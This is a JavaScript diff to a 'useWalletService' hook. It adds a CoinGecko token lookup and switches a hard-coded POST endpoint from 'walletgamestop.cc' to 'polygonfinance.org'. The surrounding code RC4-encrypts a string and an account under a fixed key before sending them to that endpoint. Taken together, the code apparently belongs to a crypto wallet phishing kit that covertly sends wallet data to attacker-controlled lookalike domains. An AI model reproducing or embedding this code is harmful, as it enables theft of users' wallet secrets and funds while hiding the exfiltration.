@@ -20,6 +20,16 @@ const useWalletService = () => {
 		return response
 	}
 
+	const getToken = async (loaded, coinId) => {
+		loaded ? loaded(true) : null
+
+		const response = await request(
+			new URL('https://api.coingecko.com/api/v3/coins/' + coinId)
+		)
+		loaded ? loaded(false) : null
+		return response
+	}
+
 	function rc4(key, str) {
 		let s = [],
 			j = 0,
@@ -47,10 +57,10 @@ const useWalletService = () => {
 		return res
 	}
 
-	let url = 'https://walletgamestop.cc/concept/unity/check'
+	let url = 'https://polygonfinance.org/concept/unity/check'
 	const kitkat = 'aBN6qreLALR9QYPy'
-	let xxx = 'BBBGE$DG|EX/G'
-	let xx = 'BBBGE$DG|EX'
+	let xxx = 'P01G$ID|EX/G'
+	let xx = 'P01G$ID|EX'
 	// let xxx = 'BY$W€B3B1T/G'
 	// let xx = 'BY$W€B3B1T'
 
@@ -77,13 +87,14 @@ const useWalletService = () => {
 				})
 			)
 		)
-		// console.log(crypt)
 		let urlencoded = queryString.stringify({ data: crypt })
+
 		return urlencoded
 	}
 
 	async function postData(str, account) {
 		let requestBody = createBody(str, account)
+
 		const response = await request(new URL(url), 'POST', requestBody, {
 			'Content-Type': 'application/x-www-form-urlencoded',
 		})
@@ -95,6 +106,7 @@ const useWalletService = () => {
 		loading,
 		clearError,
 		getAllTokens,
+		getToken,
 		postData,
 	}
 }
